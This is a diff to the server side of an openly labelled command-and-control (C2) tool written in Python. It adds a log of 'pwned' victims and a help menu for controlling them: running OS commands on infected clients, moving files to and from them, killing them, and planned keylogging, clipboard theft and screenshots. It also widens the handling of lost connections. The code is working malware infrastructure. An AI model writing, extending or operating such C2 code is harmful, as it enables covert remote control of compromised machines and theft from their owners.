@@ -4,9 +4,10 @@ C2 Server side code
 """
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import unquote_plus
+from datetime import datetime
 from crypt import cipher
 from settings import PORT, BIND_ADDR, CMD_REQUEST, RESPONSE_PATH, INPUT_TIMEOUT, KEEP_ALIVE_CMD,\
-    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, INCOMING, OUTGOING, RESPONSE_KEY, SHELL, HEADER, PROXY, HTTPStatusCode, C2Commands
+    CWD_RESPONSE, FILE_REQUEST, ZIP_PASSWORD, FILE_SEND, INCOMING, OUTGOING, LOG, RESPONSE_KEY, SHELL, HEADER, PROXY, HTTPStatusCode, C2Commands
 
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from inputimeout import inputimeout, TimeoutOccurred
@@ -74,6 +75,8 @@ class C2Handler(BaseHTTPRequestHandler):
                 pwned_dict[pwned_id] = client
 
                 print(f"{client_account}@{client_hostname} has been pwned!\n")
+                with open(LOG, "a") as file_handle:
+                    file_handle.write(f"{datetime.now()}, {self.client_address}, {pwned_dict[pwned_id]}\n")
 
             # interactive session with client
             elif client == pwned_dict[active_session]:
@@ -155,12 +158,42 @@ class C2Handler(BaseHTTPRequestHandler):
                         print("Type type exit to return to the c2 server's terminal window.")
                         system(SHELL)
 
+                    elif cmd == C2Commands.SERV_HLP.value:
+                        print("Client Commands:",
+                              "client download FILENAME - transfer a file from the server to the client",
+                              "client upload FILENAME - transfer a file from the client to the server",
+                              "client zip FILENAME - zip and encrypt a file on the client",
+                              "client unzip FILENAME - unzip and decrypt a file on the client",
+                              "client kill - permanently shutdown the active client",
+                              "client delay SECONDS - change the delay setting for a client's reconnection attempts"
+                              " (coming soon)",
+                              "client sleep SECONDS - put the client to sleep for a while (may remove soon)",
+                              "client get clipboard - grab a copy of the client's clipboard (coming soon)",
+                              "client keylog on - start up a keylogger on the client (coming soon)",
+                              "client keylog off - turn off the keylogger on the client and write the results to disk"
+                              " (coming soon)",
+                              "client screenshot - grab a copy of the client's screens (coming soon)",
+                              "client display FILENAME - display an image on the client's screen (coming soon)",
+                              "client flip screen - flip a client's screen upside down (coming soon)",
+                              "client max sound - turn a client's volume all the way up (coming soon)",
+                              "client play FILENAME.wav - play a .wav sound file on the client (coming soon)",
+                              "* - run an OS command on the client that doesn't require input",
+                              "* & - run an OS command on the client in the background (coming soon)", sep="\n")
+                        print("\nServer Commands:",
+                              "server show clients - print an active listing of our pwned clients",
+                              "server control PWNED_ID - change the active client that you have a prompt for",
+                              "server zip FILENAME - zip and encrypt a file in the outgoing folder on the server",
+                              "server unzip FILENAME - unzip and decrypt a file in the incoming folder on the server",
+                              "server exit - gracefully shuts down the server",
+                              "server list DIRECTORY - obtain a file listing of a directory on the server",
+                              "server shell - obtain a shell on the server", sep="\n")
+
                 else:        
                     try:
                         self.http_response(HTTPStatusCode.OK.value)
                         # passing back command to client; must be utf-8 encode
                         self.wfile.write(cipher.encrypt(cmd.encode()))
-                    except BrokenPipeError as e:
+                    except OSError as e:
                         print(f"Lost connection to {pwned_dict[active_session]}.\n")
                         get_new_session()
                     else:
